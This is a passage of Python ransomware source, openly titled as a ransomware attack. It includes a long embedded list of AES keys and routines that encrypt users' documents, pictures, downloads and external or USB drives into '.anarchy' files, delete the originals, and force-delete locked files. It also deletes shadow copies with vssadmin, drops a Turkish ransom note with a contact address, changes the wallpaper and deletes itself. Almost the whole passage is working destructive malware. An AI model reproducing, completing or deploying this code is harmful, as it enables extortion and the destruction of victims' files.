    b'0bb0e15bed2f6392049ade616ea1b494',
    b'65185c47dfea7bb936803a82a4d58e6e',
    b'27a0169b549244afdc189eb296ed84fe',
    b'8ac3baba001f0f1c1ff76a23df4b9be3',
    b'01f7db5ee8c9321978189dfe641c5ac1',
    b'2c637b2b082d5a44bba50f4a7e176548',
    b'd6580d182e98cb29881a9eb5575d543c',
    b'95ecbc7476566520eff092cb1b7b774e',
    b'9b0adecc319747f62b9c94e9d56cb0f2',
    b'da4b6b1d320dbfe97245f24a47937586',
    b'1ca7eb2b8f38daea9adc3675d6db4d55',
    b'c98ddc97cf68fc98999f380ac1629908',
    b'8e4766bb17d9b55a8dcf0d1d45eb0260',
    b'bd940c3ae1461e572f37b32a7dd8e5f6',
    b'de0cc4af8f9596630842903821419703',
    b'32073dcaa1d32fa99b7fc56f2d4723ac',
    b'd5db24ae0c51d8bad16261d6535f0f54',
    b'8b402afc634becd00b559ae023a63acb',
    b'dbff7885ac2d28ef3b5a420d807a632b',
    b'bb0de619a060059f4d73d6214a1f0a6a',
    b'c6eb153a9bbc28bb82f61c51cfe81389',
    b'd3fd23a6b29cf1eeac07ad815728e33b',
    b'33c1051c34dd9ad00bf967d687dcb989',
    b'9dcdfb237f0766e38aa0b2d66ee73099',
    b'1e3871bffd854a728047413283da5b78',
    b'4c8fe5e7d3c71a05a8471d98d49f5e6c',
    b'828cd060b570640a8df4aed8423302f6',
    b'be2dd90445cb71e4954b8c72f00dfba8',
    b'706a53eb86a8a0cd3c3ef4b2d427cc1c',
    b'e44302c2b2202582f6010d459e8ad818',
    b'fb44cebb37ff26221482bbdecad06551',
    b'8464c87a0724910a66d6ad8c9698f66e',
    b'fd182052c67c6a018608c05a7e78ef8e',
    b'00f02b06f1f6622a529504eff2c1cdb3',
    b'd343aba65b7dc55e90631a934a419626',
    b'88b9171fa522721e27abbd28654f7690',
    b'eef41e18a861e59609025fa8efd4a971',
    b'76ec96344375968855c8858abbd0ec35',
    b'74cb7714eb313a6b9f6032b7ebfaa63e',
    b'a1785d7e31f0091e9452ed33b3ae4739',
    b'7e4c581ecc2dad334e7472818419e7f9',
    b'efb1244daa12bed6154ae2faa4eeeefe',
    b'b91296ab842977ecab4612084c46176e',
    b'39506c8991d28a2fbadad1dc76131112',
    b'07ca9366b6863889fbeb0c865b5cb6c1',
    b'adbca363e42237e6e70e60b903f0a031',
    b'3063c9346cc7b5cdb399795875923589',
    b'2b6a7474713f2354f3afcb756e54d114',
    b'0ecf93e762916774ae6c67665c6437ed',
    b'696e37f3f4c9dbac7b85743c18f839ea',
    b'2d370ca8e2abe9c9ee1504dd864747d7',
    b'f1a33f62c4ccc8d9bfcbdf0a2c8266ec',
    b'6628ca4e93a3796d80bb452babca9c51',
    b'956e3af8f17a33753f696fa3985f771a',
    b'580f0734746d57753acb2e1df02efef3',
    b'7577317295db05aec6bb7c9e689774b2',
    b'6f165237e5fccf94826dfd321f613817',
    b'eecb84f414bb3460ba7750224b60efae',
    b'e09eccf982fa321d602863dc1984c3d5',
    b'1b63887ad6f4cfad7e28de63fd64f904',
    b'4ca513d808818206b07cf5ce16855e03',
    b'2e9a49af33bf5e0efdc7b82e9ad332be',
    b'2dad245cb20abffa346044d99b307cc3',
    b'b1435ae126fb78ce2107bea878e6c391',
    b'42f2db9f4cb4b8ba3755edd784cbbf63',
    b'3a3d09b974cfebc46393fc3d13779dca',
    b'08dbc069c9610bbebd3afb06c20021e5',
    b'cc219a35612d6a57d1e33adc389eb179',
    b'4e20144e27c5e50147f0c3f64d971464',
    b'5895512a5d5a0cfc36fbee562680406a',
    b'45c9385a0e90b858bb5b7f737acd30f9',
    b'5ceecd8ac381158a416b611e8770ad49',
    b'20fbf100c890c83a73a99b6472357d40',
    b'93760c677887dafc174858987c3fea3b',
    b'a61ebc30d94d6da2258a0a7f7d57af64',
    b'8268e55d9ed34e06635268b12e3d8e8d',
    b'91562e99ba07f221b84659ce47a7c984',
    b'c6aaaf07b76b0f77ac3385634f2803d5',
    b'736b74043969216918dc81300b1a9485',
    b'745ee0ffe2a30fc9ed6bc996652510d7',
    b'b587519e7900ef4a8ca236ae0122a044',
    b'6d86a6b1b2a6bcc6d8c401a4dd6bf5f8',
    b'd6abd111e7c3a7ef369cfc43d414c17d',
    b'4da6da09b930306323a26368c366339f',
    b'1779a08ce401db60e8b4be10147b21ce',
    b'dd443b0f6800c7434a38d87100fc4bdf',
    b'cd95ffb2a41ae01b81a84141422fd60d',
    b'c3a2f9daf8744e5a97995fa117a6b19c',
    b'320babd27e20833689de763d40466773',
    b'9ef646f8f4b2a9fb725fbbabcdf007a6',
    b'9e435124f4a44414e39be1565c777589',
    b'3f68b41326edc19e6ac95d52887af824',
    b'b6942bf2939c47f580718a164c1c14e5',
    b'ed21e617456669434052c83cde189b62',
    b'aba1ea12dfa9d4a568488b5b090df43c',
    b'd74dee812abcc960794dc46f670325f9',
    b'8b535db595171e2e0784da6a31059132',
    b'fe9a495abc1cd9f116d8c7f72bb65c20',
    b'd994e6c3f4dea13892cf181b1319c10c',
    b'51e9bcea32743ca9a3107d1c2426605f',
    b'7ccf69db2c9eaea48aad71653769057d',
    b'd5dd965b293850f9e5fc750eddf96346',
    b'48756bb2b8216391b5de4a089bfabc91',
    b'819ff782af02cdbd8200b5d10e74fc4b',
    b'250091080b5539abacc98253236ae73d',
    b'f15b4b6000646add999f712968571419',
    b'1deb0a523980c13465b2e7cb92ce0c81',
    b'54f10c2775d68e4b3f2afea72f7e47de',
    b'be6ebba770c9bd18513bcd70329687c3',
    b'0b2240d20217669aa72e6657d814da43',
    b'1d8867c34437abedf3dc3094da947294',
    b'3fadce885adbe972baa1bc3cc29f8a36',
    b'7dabbe2f4db609616814a61de2138ba7',
    b'60b17ba35fe1a9e2d7e82cd670d73e99',
    b'd7172c8052f5c4efafcbff212cbc99cd',
    b'fb6becd9814add4ef1b8049db86139cf',
    b'458daed6fb60069ebea433e38d9da16d',
    b'01908b9cff58059d252f2aab6aabd64d',
    b'bd5614f79bbdb2eb21d6af947f489cb0',
    b'0470d9c5ff2586e3da118ca868a6b551',
    b'c678eb7a2a31a360c8e4ad9b65e23c47',
    b'8743652824322c42f39424997e747e0b',
    b'dfc705ca685ec05941ed943aace9c30f',
    b'03a72a35136c06baa7eba1dcc4854316',
    b'64c4c82a60df8745f4f1f7a06113ba12',
    b'a1adc5c28f532a1f46f79ae8e09cc073',
    b'1cbf448460f58dce69aa786dce2db736',
    b'cfe5354f91663f325e8bc3518414e9b3',
    b'9aa687ef49597dcadd5236bd54783b97',
    b'293b8848f2813bdda227d22f8fd3f521',
    b'e27c7ab42b7fef53edc72cad3f487b97',
    b'93b2edba11d6446765fe509be01b81c5',
    b'883b7e2848ec200a9895511366ad1785',
    b'9f1bcc3a6bd862fb9546717a559927fe',
    b'20a6a225ced89353c53d7294976c1198',
    b'de39a46fe350745bf13214acf59c3514',
    b'80b8798e7ad0981b3dd05386e4648bc6',
    b'77ace1af718d1abb45c4f3ed90ca633b',
    b'afb30209951cfd6480db9b1b31ba3d32',
    b'ac5e6f12baaefbe556756bacd3ddabeb',
    b'5419dc53f69cfff836ab34752af0a278',
    b'90fc2f81dded2b64ed9d46140ca7c773',
    b'be4339ec5d132e53edd970f0bcc0002d',
    b'7a1e3d0b458c396a700667ab720a92b0',
    b'da20e7a3962102c850faf1901626a00a',
    b'3a0712c2d12d4b1a73924683c6e98264',
    b'54a23a614d8d65b1fde488c013b6ce87',
    b'9f09049379634336bd413c6bf664f081',
    b'26fc355f19a99e1805e7c9058f053748',
    b'52d6c5b8570b73461e1327d11ea2f2b8',
    b'01ecc3bfe40c7db7b0b5de6da1d25f9b',
    b'4f357aee5576019eb33ee9890b9f19b7',
    b'153f57edd9bfa3c584b35b6a3adea978',
    b'e7b1cc183b9683af76bf4908c27514ff',
    b'2b10339fe8dc2cb8d4876a34c565cb61',
    b'a0ed9e5a7218d6de62524d5179316452',
    b'6d48a02ae882fe6df341fd721a89a35b',
    b'3aa26364d1108fafa761b7584e0b500e',
    b'd045bef5038f8f8200c86c7e858fb98a',
    b'ceacee506ab5d6ab3b06d5ea40eefd39',
    b'81507448b4a6e4e80cc6388451bc8011',
    b'b69aa724e6d15583c41408a490fb8d55',
    b'6f69af108bb832cd63bd2d0de1573cc9',
    b'5a4e60efcd844a541bf1ef494c740418',
    b'0c620fd19b42d9597fff5d7d9525ea8b',
    b'9fa8d6c5064634de931191cf6ec13d08',
    b'4840d6ed4426ca5d7276f0726be5dcaa',
    b'c2d8754e70af6272148577b9dd24e48d',
    b'30a2a7900b5d9ceb1fd5ccb2cdccc2da',
    b'6d3ad4afa52bb3130632ab189e462fa9',
    b'44dcad9ed65c3447e805218c173c8d23',
    b'db49a37c1bf69847309775d2be64fb36',
    b'cb1d7ffc730c879725ee058fcead1aa1',
    b'4aeec24bf2c7bb668e95a87ec7ca80dd',
    b'348278c7f75a2d47d742b5fe9d0e1d30',
    b'783ea8434a95530d80a72932684e2657',
    b'a0da8cd8f9d3bdb7da399a497d613801',
    b'306b5a7f4d86ea20e3363272d8cb5c25',
    b'41ec8ce8dca7a289265b6ec16b601c08',
    b'9002ebddb11cff6a5f6bf9863d265ddb',
    b'7331faa2c8af13da96f2a2df425793eb',
    b'9183546eef042163429bba9e93cf5aa2',
    b'7b36c3932613c6a87f3783a762551933',
    b'd2fb6a3b7445eb82412593bc7fbd2b8b',
    b'45df93d1513ea37432af1033afb1318f',
    b'cfba4d328e7b422ba680217d2eb9acaf',
    b'4ea7b4534dbd331c19ecdf4603d7307a',
    b'a7bb1b04fc84e0fbb2e134bd10f47afb',
    b'cbfcf13187d41367316727df0acb9b11',
    b'7df1fa3a5f825056ca231c9b62fc7b6c',
    b'5f3334cebaf5f957a475bbdcc249b7dd',
    b'48a4314a5206f9261c126fa09940e3fc',
    b'9c6efe69a125ae7545e1091ade5e2ef1',
    b'20696a2b0d0a7144d5945db0f861b021',
    b'efbbbf69885878b8aa2314b78c056118',
    b'be539582d5012200fb8ff0bc4934334a',
    b'8276a4ffd3fb5eb9a1824d517d6bf1c3',
    b'58d9537a312c356ac36abf57e2bebd76',
    b'c1304dcbd585167c26ec4c4c680046f4',
    b'708fba6d3d4c6aa7dc1f1454adb6e9e7',
    b'f90dbf32dd7536e8387f9fef0bdf6d9c',
    b'de654a9ab0a74c40af6152ee1f494c68',
    b'f167039d9a7870bd293079b311214cce',
    b'7d1e2bac9219f0861b9a4782ff35f376',
    b'6d9a1b42452021047b11592d7f74e6ef',
    b'0921789589bcf1b50f1265f546c6ac62',
    b'b77b9f39d7ab1a269ef13d8743d34062',
    b'4c54773f83df62dfc33eae2d19b7ef92',
    b'baf42aff88983b5504f1a941f26dab04',
    b'9b3f32744bfa24adb4d65b066d6cf9b6',
    b'5ac51815db68129fe3f626f5b1216d12',
    b'87a4ba8c76e015056ffb46abdb63afa1',
    b'5dc5245a561d8a1ecbda241952446d33',
    b'6f70cb8af07faa5c0315fbcc8afa0ab4',
    b'1aecd4195fc11c43a22f27b13449e437',
    b'1e727702439109f717a6f4dc840936e8',
    b'9c88ba2e82692c30260c6a91d00a327d',
    b'13ba1e3c85fb0efe68e575ffc3063e43',
    b'676d74151e1b21bcc79ea29facc9f3f7',
    b'ef3a9904c96a209d2eb7f1516e3623d2',
    b'7fad041df35138d913df550ee4bf50ea',
    b'8f0a2a6f5df44142b2d08b2752523e96',
    b'86d3c446096973c59bc4eb764946cfa4',
    b'e7236c070d071437c6c728584338d20d',
    b'ed806db7e75e4e301e4fe6e02746c7dd',
    b'f9d63c387f66093337010a7a8cd09e8a',
    b'7e3a607a5aa8c32c5d0f5e334c683642',
    b'bad8182c275aa880bd2647fa02a706a9',
    b'3e2bd6bc4ff1734761c2cbd0171e3ffb',
    b'c1e72d94bba0bf19b08afb38e3239608',
    b'3144376d07a5cbd6a3efd862c5506fe1',
    b'db5ed6fa797fe204fccd8b0ff130225c',
    b'384ab45a967a5c920e49023c08d4ce48',
    b'a6bc70e226fa1e2b72ff75f16a18f19d',
    b'8ecde8a0a3a6390284e906757799afc9',
    b'07dc79ade0542f12e2269a850a536c94',
    b'384962c5ca9fd1fa107ceb1460ee58e7',
    b'acfc5ddaef3cf1d67ac322a740c39a14',
    b'9952223e21265127fb290ec3cf968fa2',
    b'268a976f4c3aa701019e226e887ebfbb',
    b'a0f7a4e3637fde2d7a8c2ce4356f756a',
    b'59406ec389ee21d7875d5b783fb450c1',
    b'e8cd9788de0df8c36a8213b6408b551a',
    b'c957179cda143a67789e148896ba103e',
    b'425d866753054cf76ba9bf0a6d10894c',
    b'c96737e318693bb177b3ff6173855903',
    b'98877e1907d0a51af03c0bbd705f1fb8',
    b'2c3884ad40a696fab1b026c3ceb101a5',
    b'061248d3bfa385c1d44cbc953f10bf8b',
    b'b1eda1a2c74464a811320b9cf1463568',
    b'66fc258e978840961336c2d51a265bbb',
    b'4211500e53c5448c98f037fe470c085f',
    b'27a20f5c90267a3985f555c41e88f8e3',
    b'b0c24da8c60753fde62772d5dd2ed4ab',
    b'cfb96840cef798a44652e21896df6859',
    b'bd34e40a8155475107f7d163d16c3731',
    b'b3cbb76d09af3d36d0232b57ac9203ed',
    b'c66b2d4daaa40f7976c8ea5db94e9f76',
    b'560b967f5d121aa7fdcad190236dc9ac',
    b'29c8a7231f1ad55a31af9da16e14ef19',
    b'b565f077239549755c50add850977856',
    b'2c9f7ac422440d9fd7df606e25fb6d2a',
    b'cac51bac62f1d30805ea2997f8ac8c0e',
    b'c7b298378ab32de593b5225fc5006ad1',
    b'c38bb24db8c77f84fffaf415134d697e',
    b'67489881c158399f16280bf8dcc49d4f',
    b'0af92b6047ccaa0bafef809a106f62d9',
    b'd8d24fec88d69b80cd40f7be1e5dec8d',
    b'847537ee681cfffb102a03c4cf6ac492',
    b'da5e2991286f135f2626d6b97ff00257',
    b'4880a04f3c613223a88ed1f62583426e',
    b'b418486a1e4bf5e44e59360cfef95071',
    b'a8676677187397ef2379a53348f2c698',
    b'70fc1af371487fb3049eda82c323cec7',
    b'9b6a1e01aac1faac2b3901f2f756b304',
    b'3152217ae5c685be4f37bfd641cb16cc',
    b'15d1188bc19868724341ed48446b5bac',
    b'2bdadddb469dcb626a52f9be98d90470',
    b'4d89b344d7611491df9da778c7bf65fe',
    b'38735c56de1e421a941cbc5eb8d74973',
    b'be9bb64b73cacff65d9a1f625ed9e179',
    b'761dfaccca06c9e30c88f9a99ce225bd',
    b'bb2b3c99583ddc07444ab11c4d03a378',
    b'5abfde95dd06b103dda8736df49dd771',
    b'2c13a6a0757bf86eb41240692d2a10aa',
    b'4d11a461095256cc2e90a88cf3a78384',
    b'a6c19ffce984ad80f3ff07c04c73774c',
    b'60a7b9ba20aeecd99691777d8a93158f',
    b'e47bb147f2e9515fff8044ce2abe27e4',
    b'b2cb8038b7a8d754a78f2021550fb4d2',
    b'c143826cbbaf9793451100a3521b7ea4',
    b'95004efe6fd67ffc40a2dd73402cd214',
    b'84a511cd6f853fb4682fbd41c14bea12',
    b'3790d84a6bc119776d5683d52cd40ee2',
    b'738c3581ed238856b1eb86e736298119',
    b'03f246a36c3259f34df5d724c383fb25',
    b'0f62724b0f5b3f1ceac48c2d8f3880f2',
    b'dc87dffe41f7bc2553e167d2ec1ae6e6',
    b'1b9ebedd360930cdb1ef247448378dec',
    b'150f6ee747bacd029646f73d0dfdaf88',
    b'372bbbc96baa7f0eba46a054445badd2',
    b'e1b4191cf6e1fe7c86b5668d47604e2e',
    b'4b34c6942d05173065b194feb109a7e5',
    b'dba7a5072008c1953bcd213e8eb6e79d',
    b'50251e7f83b8c221656f3cb54ffd77dd',
    b'175662be353734c14d5c1b1856e9afcc',
    b'a5460156ea01cd2435816a3d2f269c0c',
    b'8aa60e76a0f5844a28d240958c4dc0e7',
    b'ca691652b2710438b8c346bf6fdb18c0',
    b'6764780ebec9fe98bcb71f569a1105e7',
    b'cb2cc4e2afdedc20cb759b1a2189644a',
    b'3e3a5a8f63cb104f3aacbf23b862011e',
    b'aa5e625f973a0e1494b36dabee0431e2',
    b'91e7fbcc670460c0d9f9a97f1d502a53',
    b'a6e78abc3dd1363232e6a17dd031ddd9',
    b'36de11df998aec26207c021cd369973b',
    b'7255a534d0793668f923b1f4b146a0ed',
    b'818a024fd2dc993b0d8a27f475af68a2',
    b'd9e41cd505a344fbff48919d8cb976eb',
    b'690400a90ab548863de0e9f1d4f248c1',
    b'801a9f9361ba9f4ef01dcb501a220bac',
    b'e11194ecc4cedc8b487d0d8772922813',
    b'54d316f8784c105c8a48b1c11a4231fd',
    b'd19220c7dee26200c5b13c9e9c5b323c',
    b'bd021f0e08698915d093831edbd30420',
    b'776fbbbd8bba5be5cbd2ccda41143d1f',
    b'ebd9814b81f7d6a1ede5f715c9d9e502',
    b'c433de40bb4bb723457308e55fa4946d',
    b'e6aa22983488671eb53edb5ecf123ac0',
    b'fe9902dd7f7512e98aab67341a39fd7b',
    b'2761cb8b439b93deb4b82e476ad00ff1',
    b'880470b9500b26236bbae9dbc06ba546',
    b'590a4ef36ec005f1f48dfcb051fedda3',
    b'7b5eb1a84786648ef8865d68b19f4228',
    b'44342387de28181477cf0580a40550ea',
    b'2483926f92971129e8aa69f9eab8e67b',
    b'0f4bbd74ee7fab47617cf8f9cda91457',
    b'd8a87cec06ca573647bd314690b7c185',
    b'03c67b1c901747d45f444fd173cbea8d',
    b'55e1b3859d57c4ca70c23f897a6df943',
    b'4193e68193c739102952d623fb2f7409',
    b'f0cd7b22038cfb975f315ea72630ddca',
    b'd37505389963864c4d155d20a7120710',
    b'bda8d80d9c6695fb8f3aec6983fc7c91',
    b'3a123c76ff421ca89e90faee89a386db',
    b'596bafe2e46f85b49923056ee325e32f',
    b'a701da7f61b3ec8447cd791211c1aff2',
    b'585676eeadd59645bb5cda827e1db1fb',
    b'32d66635e406a904e7a1998e2d99d3df',
    b'8beac1ec516703723f278ba14f3707da',
    b'e98e01ea08a9b539d3c4ef1b9e595ade',
    b'196bdc76553f06f6b382c02867b01d2e',
    b'69b6baeb1b5848790cfa608e725784e0',
    b'898674492edb0e06e107ff6dd51d12fb',
    b'6b62e5d22f97fab4d6c0b5379eb35f06',
    b'6fbf3de8d03ac882423ab41148981698',
    b'a87e9942c2ff7c38b13b9d6143509617',
    b'c6a359d53e1831a600930f1fc9b76d12',
    b'35e45f4ff7ca66856fb9b54c0ee344b0',
    b'8fcad1bb8537fb5fadad8ee2a4f837e3',
    b'3b44a8f9905a2415a53db0bd4ceb34fb',
    b'ad1735c6f7ea273a8fa38a64544c6159',
    b'b81b4defa11bf4cdee03c3f231d953b6',
    b'3aad9c4d17d245f5298825c9f2627e68',
    b'66485c135acce988af3b25e084d0d49b',
    b'ab7f85ca757313afdeafe44200e8c52b',
    b'2d3c6f351fbfd43ba7dbd6ab8afa0386',
    b'9e9f5cc400da8acfecf87b79b02f0847',
    b'56dc093f1dc1d563bbdda0763890ac59',
    b'2407bd8d46bfea93590496ac68db67cb',
    b'a78c5c1c4091b0b8547d28f010695d18',
    b'6e846077712efdd9a71c9ffc5b68c1ec',
    b'9ae822af1ec874cb70b2f8c73bd118b1',
    b'22dc5c02772740c9c2bbbec456aadd3a',
    b'de968ddcec669762d1c08194e925b9be',
    b'58f8d3245cede08df99a927c689bb60d',
    b'f4b5057c0993ccbd1001066867af897f',
    b'1fbae29b1deeb74b9174b8495acf8f2a',
    b'52ae2e50808323673ca71ff7ae3584dd',
    b'8794ca6753c03309728b47582c515590',
    b'878040ac01afc30aae1d891d832b770d',
    b'72fabe7dfb2a40b2d7b6b949b2efe24d',
    b'cff860158601086a1d26c7c31a930fc7',
    b'255a63429093e3513c03da33ce92a970',
    b'e1dfe6dbe6c3a13aa6bb36acea5add19',
    b'ac135b5c9d999d52ce061ef1434e4bea',
    b'3941f4c7b88ad59e882f9b0aceebdcd0',
    b'fddb297460b2ad55731d43ce772c824f',
    b'936f2cf3f1bd25f0c2ad885b953ed2c9',
    b'2381ad6867872ef61dfb210c4e5fa348',
    b'65583fcc0b7bac4a186944c23e344e6a',
    b'53619f4c88d64fd17a850051180fd74b',
    b'8829546151dbf0702edaea0c4a7f20ef',
    b'bed6dc2315aef084baeb40ce07b4b8ce',
    b'd3f0d6298c0b51570308739ff55db6c6',
    b'dc16addbe1c093866ebabbed37ca9e31',
    b'53c7d01f2fbba651bf7b9b21ed38ebdb',
    b'e0b80b6f748c68d362dded4a20c9a6a3',
    b'02bb892a1a6e18194506853838763bf6',
    b'04d58e002673f4e32684cf1d6342ae8c',
    b'61865d4d127f4351106b63c1d6753ee8',
    b'0da29c2cd736d85352a354b738791301',
    b'3ed67af048784d7c37337f52dc039865',
    b'd9fc5cf4cc1f3e719c0f8dd667377dc9',
    b'1d34ec8a22940fb2f3c0d1c463992686',
    b'5fb22a75333b0703612254931d101c63',
    b'9fd1756ffb6daaae049a898a50c13b92',
    b'1566473ce6592aedddb46b651f8a0427',
    b'81f77a00a33a8742382ea9e64cd25f0f',
    b'821bf655382d8fd32a16eb12b9eb6eda',
    b'06bb61d2fffd2ff0cd3857ef29ed0ffb',
    b'919f5155347b570cc03c45a81cf848b6',
    b'6ae632990020c823564ad8179dfa9bfd',
    b'37849938dd36de4ea0191d879caddaad',
    b'2087431b3cc4cdabb07b142908c158c1',
    b'14dad5203d41bbc2dde6a21edb9a033b',
    b'9e43801fe5cba066324d78748d0ccf32',
    b'28292f9fd7d5acbea29ff022cd80cc1e',
    b'65364c09b8f21a1e38e59d31be1f734f',
    b'282686d02a05399fb9bbcab40a2a00db',
    b'095efd6da1bfb7487ac04af12489b850',
    b'92ebd784780a21f33a1d464a1b8057cb',
    b'f8ebd8693379ff68c92d6bd29c89e20f',
    b'55821e972cb5b76bd59674dc2946595b',
    b'fc40bf6e5ff3157c0a7ee3f8422042bb',
    b'0e7e3bb8bcae654249ee2fd03d97c1fc',
    b'4e7ee669f316aa9276495ed25bc07e54',
    b'd7b17e948c6bbdc3a575c4fda5d572b0',
    b'5e0690c6ab90327f9ccc32533acbd1de',
    b'5bf074a00205bf652a30e9585e408a6a',
    b'4250426bf834191466b4af4833adb61c',
    b'b44ac45e71998e9e79de9e0f84e0b914',
    b'e622a343260551f135c337ef5c4e5129',
    b'c6446eee894cd1cd912a16abe5512204',
]

note_content = ("Yuziak  i\xe7in \u00F6zel tasarlanm\u0131\u015F vir\u00FCst\u00FCr. Bu vir\u00FCs\u00FC almak i\xe7in l\xfctfen bana ula\u015F\u0131n\u0131z.\n\n"
                "Personel kimli\u011Fi: {},\n\n"
                "\xD6deme b\xfct\xe7esi: 1 milyon dolar (ciddi de\u011Fil, \u015Faka) Yakla\u015F\u0131k 30 g\xfcn\xfcm gitti ve daha yeni bir y\u0131la girdim kodlama deneyiminde.\n\n"
                "Bana protonkral5668@proton.me adresinden ula\u015Fabilirsiniz, b\xf6ylece dosyalar\u0131n\u0131z\u0131 \xE7\xf6zebilirim ve bedavaya, evet bedava.\n\n"
                "Sak\u0131n personel kimli\u011Fini silme ve sildiysen C:\\ klas\xf6r\xfcne bak - Anar\u015Fist PanOS"
)

def get_logical_drives_powershell():
    try:
        command = "Get-Volume | Select-Object -ExpandProperty DriveLetter"
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        drives = [drive.strip() for drive in result.stdout.split('\n') if drive.strip()]
        
        usb_command = "Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | Get-WmiObject -Class Win32_DiskPartition | Get-WmiObject -Class Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID"
        usb_result = subprocess.run(["powershell", "-Command", usb_command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        usb_drives = [drive.strip() for drive in usb_result.stdout.split('\n') if drive.strip()]
        
        return drives + usb_drives
    except Exception:
           pass

def run_powershell_command(command):
    try:
        process = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        result = process.communicate()[0]
    except Exception:
           pass

class AnarchyLogoWidget(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.create_widgets()

    def create_widgets(self):
        self.anarchy_label = tk.Label(self, text="Anarchy", font=("Arial", 40, "bold"), fg="red")
        self.anarchy_label.pack(expand=True, fill=tk.BOTH)

class RansomwareApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Fidye yaz\u0131l\u0131m\u0131 sald\u0131r\u0131s\u0131")
        self.geometry("600x400")

        self.personal_id = self.get_personal_id()

        if self.personal_id:
            self.modify_aes_keys()
            self.encrypt_user_folders()
            self.remove_shadow_copies()
            self.display_alert()
            self.anarchy_logo_widget = AnarchyLogoWidget(self)
            self.anarchy_logo_widget.pack(expand=True, fill=tk.BOTH)
            source_file = os.path.join(os.path.dirname(__file__), 'AnarchyHackers.png')
            if not os.path.exists(source_file):
             source_file = os.path.join(os.path.dirname(sys.executable), 'AnarchyHackers.png')
            threading.Thread(target=set_wallpaper, args=(os.path.abspath(source_file),)).start()   
    def get_personal_id(self):
        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        personal_id_file = os.path.join(system_drive, "YOUR_SECRET_PERSONAL_ID.txt")
        if os.path.exists(personal_id_file):
            with open(personal_id_file, 'r') as f:
                return f.read().strip()
        else:
            aes_key_index = int(get_random_bytes(1).hex(), 16) % 999  # Generate a random index
            personal_id = self.generate_personal_id(AES_KEYS[aes_key_index], aes_key_index)
            try:
                with open(personal_id_file, 'w') as f:
                    f.write(personal_id)
                return personal_id
            except Exception:
                return None

    def generate_personal_id(self, aes_key, aes_key_index):
        try:
            aes_key_index_str = str(aes_key_index + 1).zfill(3) if aes_key_index < 99 else str(aes_key_index + 1)
            
            random_hex = get_random_bytes(30).hex()
            personal_id_suffix = random_hex[:60]
            
            personal_id = aes_key_index_str + personal_id_suffix
            
            return personal_id
        except Exception:
            return None

    def modify_aes_keys(self):
        if not self.personal_id:
            return

        personal_suffix = self.personal_id[-4:].encode()
        for i in range(len(AES_KEYS)):
            AES_KEYS[i] = AES_KEYS[i][:-4] + personal_suffix

    def encrypt_file(self, key, in_filename, out_filename=None, chunksize=64 * 1024):
        if not out_filename:
            out_filename = in_filename + '.anarchy'

        if in_filename.endswith('.anarchy') or os.path.basename(in_filename) in ['README.txt', 'YOUR_SECRET_PERSONAL_ID.txt']:
            return False

        iv = Crpyto.Random.new().read(AES.block_size)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        
        infile = None
        outfile = None

        try:
            filesize = os.path.getsize(in_filename)
            infile = open(in_filename, 'rb')
            outfile = open(out_filename, 'wb')
            
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if not chunk:
                    break
                if len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

            infile.close()
            outfile.close()

            try:
                os.remove(in_filename)
            except Exception:
                pass
                try:
                    for proc in psutil.process_iter(['pid', 'name']):
                        if in_filename.lower() in proc.info['name'].lower():
                            subprocess.run(['taskkill', '/F', '/IM', proc.info['name']], creationflags=subprocess.CREATE_NO_WINDOW)
                    subprocess.run(['takeown', '/f', in_filename], creationflags=subprocess.CREATE_NO_WINDOW)
                    subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{in_filename}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception:
                    pass

            return True
        except Exception:
            return False

    def encrypt_folder(self, folder_path, aes_key):
      try:
        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        
        if folder_path == system_drive:
            return
        
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(aes_key, file_path)
        if self.personal_id:
            readme_file_path = os.path.join(folder_path, "README.txt")
            with open(readme_file_path, 'w') as readme_file:
                readme_file.write(note_content.format(self.personal_id))
      except Exception:
       pass
    
    def encrypt_user_folders(self):
     try:
        if not self.personal_id:
            return

        aes_key_index = int(self.personal_id[:3])
        aes_key = AES_KEYS[aes_key_index - 1]

        system_drive = os.getenv('SYSTEMDRIVE') + '\\'
        drives = get_logical_drives_powershell()

        non_system_drives = [drive for drive in drives if drive != system_drive]

        download_dir = userpaths.get_downloads() or os.path.join(os.path.expanduser('~'), "İndirilenler")
        documents_dir = userpaths.get_my_documents()
        desktop_dir = userpaths.get_desktop()
        pictures_dir = userpaths.get_my_pictures()
        music_dir = userpaths.get_my_music()
        videos_dir = userpaths.get_my_videos()

        user_folders = [download_dir, documents_dir, desktop_dir, pictures_dir, music_dir, videos_dir]

        for folder in user_folders:
            self.encrypt_folder(folder, aes_key)
    
        for drive in non_system_drives:
            self.encrypt_folder(drive, aes_key)
     except Exception:
           pass

    def display_alert(self):
        try:
            personal_id = self.personal_id
            if personal_id:
                intro_text = note_content.format(personal_id).split('\n')

                for line in intro_text:
                    label = tk.Label(self, text=line)
                    label.pack()
        except Exception:
           pass
    def remove_shadow_copies(self):
        try:
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
           pass
    def closeEvent(self, event):
      try:
        os.remove(__file__)
        os.remove(sys.executable)
        event.accept()
      except Exception:
        try:
            subprocess.run(['takeown', '/f', __file__], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['wmic', 'path', 'CIM_DataFile', 'where', f'name="{__file__}"', 'delete'], creationflags=subprocess.CREATE_NO_WINDOW)
